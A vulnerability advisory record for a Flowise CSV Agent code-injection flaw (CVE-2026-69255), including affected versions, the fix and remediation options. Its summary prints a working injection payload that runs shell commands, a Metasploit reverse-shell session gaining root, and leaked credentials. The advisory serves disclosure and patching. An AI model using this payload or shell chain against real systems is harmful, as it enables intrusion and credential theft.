@@ -1,0 +1,370 @@
+advisory_id: GHSA-vmv7-4m6c-3cg5
+datasource_id: github_osv/GHSA-vmv7-4m6c-3cg5
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-vmv7-4m6c-3cg5/GHSA-vmv7-4m6c-3cg5.json
+aliases:
+  - CVE-2026-69255
+summary: |
+  Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection — Root Shell Verified
+  ## UPDATE 2026-05-20: Full RCE as root VERIFIED
+
+  **This is not theoretical — a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**
+
+  ### Verified Exploit Chain
+
+  1. Python code injection via `base64_string = "${base64String}"` (CSVAgent.ts line 161)
+  2. Pyodide `js` bridge provides access to the host Node.js process
+  3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)
+  4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)
+
+  ### Working RCE Payload
+
+  ```
+  ";import js;e=js.globalThis.eval;e("process.mainModule.constructor._load('child_process').execSync('id')");#
+  ```
+
+  **Constraint:** No commas allowed in payload — `csvFile.split(',')` splits on all commas.
+
+  ### Metasploit Session Proof
+
+  ```
+  msf > use exploit/multi/http/flowise_csv_agent_rce
+  msf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
+  msf > exploit
+
+  [+] Authentication successful
+  [+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4
+  [*] Sending stage (3090404 bytes) to 172.17.0.2
+  [*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)
+
+  meterpreter > getuid
+  Server username: root
+
+  meterpreter > sysinfo
+  Computer     : cbce3fb352b7
+  OS           : Linux 6.8.0-111-generic
+  Architecture : x64
+  Meterpreter  : x64/linux
+
+  meterpreter > shell
+  # id
+  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+
+  # uname -a
+  Linux cbce3fb352b7 6.8.0-111-generic x86_64 Linux
+  ```
+
+  ### Additional Verified Impact
+
+  **Credential Theft:**
+  ```
+  FLOWISE_PASSWORD=admin123
+  DATABASE_PATH=/root/.flowise
+  APIKEY_PATH=...
+  ```
+
+  **Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` → `cbce3fb352b7`
+
+  **Server DoS** — certain native binding calls (spawn_sync) crash the Node.js process entirely.
+
+  ### CVSS v3.1: 9.9 CRITICAL
+
+  `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
+
+  ---
+
+  ## Original Report (below)
+
+  ## Vulnerable Code
+
+  **File:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`
+
+  **Lines 133-138** — Unsanitized string extraction from data URI via `file.split(',').pop().pop()` — no validation on content.
+
+  **Lines 155-171** — Direct interpolation into executable Python code:
+  `base64_string = "${base64String}"` is inserted into a Python string literal via JS template literal. If the string contains a closing double-quote followed by Python code, it breaks out of the string context.
+
+  `validatePythonCodeForDataFrame()` denylist is only applied to LLM-generated code at line 198, NOT to this initial code block at line 171.
+
+  ## Remediation
+
+  **Option 1 (Best):** Use `pyodide.globals.set('base64_string', base64String)` instead of string interpolation
+
+  **Option 2:** Validate base64 before interpolation — reject if not matching `/^[A-Za-z0-9+/=]*$/`
+
+  **Option 3:** Escape special characters (`"`, `\n`, `\r`, `\\`) before interpolation
+
+  ## Related CVEs
+  - CVE-2026-41264 (CSV Agent regex bypass)
+  - CVE-2026-41265 (Airtable Agent sandbox bypass)
+  - CVE-2026-46442 (NodeVM sandbox escape)
+
+  **Disclosure:** Identified with AI assistance (Claude Code). Analysis, verification, and Metasploit module by S9S Bounty-LAB / Kamal Sentassi.
+impacted_packages:
+  - purl: pkg:github/flowiseai/flowise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flowiseai/flowise
+        commit: f4e2794f6a576b94578f2fdafbf49c2fb304626c
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.1.2
+    fixed_versions: vers:npm/3.1.3
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+      - pkg:npm/flowise@3.0.13
+      - pkg:npm/flowise@3.1.0
+      - pkg:npm/flowise@3.1.1
+      - pkg:npm/flowise@3.1.2
+    fixed_packages:
+      - pkg:npm/flowise@3.1.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise-components
+    affected_versions: vers:npm/<=3.1.2
+    fixed_versions: vers:npm/3.1.3
+    affected_packages:
+      - pkg:npm/flowise-components@1.0.0
+      - pkg:npm/flowise-components@1.1.0
+      - pkg:npm/flowise-components@1.1.1
+      - pkg:npm/flowise-components@1.2.1
+      - pkg:npm/flowise-components@1.2.2
+      - pkg:npm/flowise-components@1.2.3
+      - pkg:npm/flowise-components@1.2.4
+      - pkg:npm/flowise-components@1.2.5
+      - pkg:npm/flowise-components@1.2.6
+      - pkg:npm/flowise-components@1.2.7
+      - pkg:npm/flowise-components@1.2.8
+      - pkg:npm/flowise-components@1.2.9
+      - pkg:npm/flowise-components@1.2.10
+      - pkg:npm/flowise-components@1.2.11
+      - pkg:npm/flowise-components@1.2.12
+      - pkg:npm/flowise-components@1.2.13
+      - pkg:npm/flowise-components@1.2.14
+      - pkg:npm/flowise-components@1.2.15
+      - pkg:npm/flowise-components@1.2.16
+      - pkg:npm/flowise-components@1.2.17
+      - pkg:npm/flowise-components@1.3.0
+      - pkg:npm/flowise-components@1.3.1
+      - pkg:npm/flowise-components@1.3.2
+      - pkg:npm/flowise-components@1.3.3
+      - pkg:npm/flowise-components@1.3.4
+      - pkg:npm/flowise-components@1.3.5-alpha.0
+      - pkg:npm/flowise-components@1.3.5
+      - pkg:npm/flowise-components@1.3.6
+      - pkg:npm/flowise-components@1.3.7
+      - pkg:npm/flowise-components@1.3.8
+      - pkg:npm/flowise-components@1.3.9
+      - pkg:npm/flowise-components@1.3.10
+      - pkg:npm/flowise-components@1.3.11
+      - pkg:npm/flowise-components@1.4.0-rc.1
+      - pkg:npm/flowise-components@1.4.0
+      - pkg:npm/flowise-components@1.4.1
+      - pkg:npm/flowise-components@1.4.2
+      - pkg:npm/flowise-components@1.4.3
+      - pkg:npm/flowise-components@1.4.4
+      - pkg:npm/flowise-components@1.4.5
+      - pkg:npm/flowise-components@1.4.6
+      - pkg:npm/flowise-components@1.4.7
+      - pkg:npm/flowise-components@1.4.8
+      - pkg:npm/flowise-components@1.4.9
+      - pkg:npm/flowise-components@1.5.0
+      - pkg:npm/flowise-components@1.5.1
+      - pkg:npm/flowise-components@1.5.2
+      - pkg:npm/flowise-components@1.5.3
+      - pkg:npm/flowise-components@1.6.0
+      - pkg:npm/flowise-components@1.6.1
+      - pkg:npm/flowise-components@1.6.2
+      - pkg:npm/flowise-components@1.6.3
+      - pkg:npm/flowise-components@1.6.4
+      - pkg:npm/flowise-components@1.6.5
+      - pkg:npm/flowise-components@1.6.6
+      - pkg:npm/flowise-components@1.6.7
+      - pkg:npm/flowise-components@1.6.8
+      - pkg:npm/flowise-components@1.6.9
+      - pkg:npm/flowise-components@1.6.10
+      - pkg:npm/flowise-components@1.7.0
+      - pkg:npm/flowise-components@1.7.1
+      - pkg:npm/flowise-components@1.7.2
+      - pkg:npm/flowise-components@1.8.0
+      - pkg:npm/flowise-components@1.8.1
+      - pkg:npm/flowise-components@1.8.2
+      - pkg:npm/flowise-components@1.8.3
+      - pkg:npm/flowise-components@1.8.4
+      - pkg:npm/flowise-components@1.8.5
+      - pkg:npm/flowise-components@1.8.6
+      - pkg:npm/flowise-components@2.0.0
+      - pkg:npm/flowise-components@2.0.1
+      - pkg:npm/flowise-components@2.0.2
+      - pkg:npm/flowise-components@2.0.3
+      - pkg:npm/flowise-components@2.0.4
+      - pkg:npm/flowise-components@2.0.5
+      - pkg:npm/flowise-components@2.0.6
+      - pkg:npm/flowise-components@2.0.7
+      - pkg:npm/flowise-components@2.1.0
+      - pkg:npm/flowise-components@2.1.1
+      - pkg:npm/flowise-components@2.1.2
+      - pkg:npm/flowise-components@2.1.3
+      - pkg:npm/flowise-components@2.1.4
+      - pkg:npm/flowise-components@2.1.5
+      - pkg:npm/flowise-components@2.2.0
+      - pkg:npm/flowise-components@2.2.1
+      - pkg:npm/flowise-components@2.2.2
+      - pkg:npm/flowise-components@2.2.3
+      - pkg:npm/flowise-components@2.2.4
+      - pkg:npm/flowise-components@2.2.5
+      - pkg:npm/flowise-components@2.2.6
+      - pkg:npm/flowise-components@2.2.7-patch.1
+      - pkg:npm/flowise-components@2.2.7
+      - pkg:npm/flowise-components@2.2.8
+      - pkg:npm/flowise-components@3.0.0
+      - pkg:npm/flowise-components@3.0.1
+      - pkg:npm/flowise-components@3.0.2
+      - pkg:npm/flowise-components@3.0.3
+      - pkg:npm/flowise-components@3.0.4
+      - pkg:npm/flowise-components@3.0.5
+      - pkg:npm/flowise-components@3.0.6
+      - pkg:npm/flowise-components@3.0.7
+      - pkg:npm/flowise-components@3.0.8
+      - pkg:npm/flowise-components@3.0.9
+      - pkg:npm/flowise-components@3.0.10
+      - pkg:npm/flowise-components@3.0.11
+      - pkg:npm/flowise-components@3.0.12
+      - pkg:npm/flowise-components@3.0.13
+      - pkg:npm/flowise-components@3.1.0
+      - pkg:npm/flowise-components@3.1.1
+      - pkg:npm/flowise-components@3.1.2
+    fixed_packages:
+      - pkg:npm/flowise-components@3.1.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.2'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-vmv7-4m6c-3cg5/GHSA-vmv7-4m6c-3cg5.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/pull/6499
+    reference_type: other
+    reference_id: 6499
+  - url: https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c
+    reference_type: other
+    reference_id: f4e2794f6a576b94578f2fdafbf49c2fb304626c
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.3
+    reference_type: other
+    reference_id: flowise%403.1.3
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5
+    reference_type: other
+    reference_id: GHSA-vmv7-4m6c-3cg5
+exploits: []
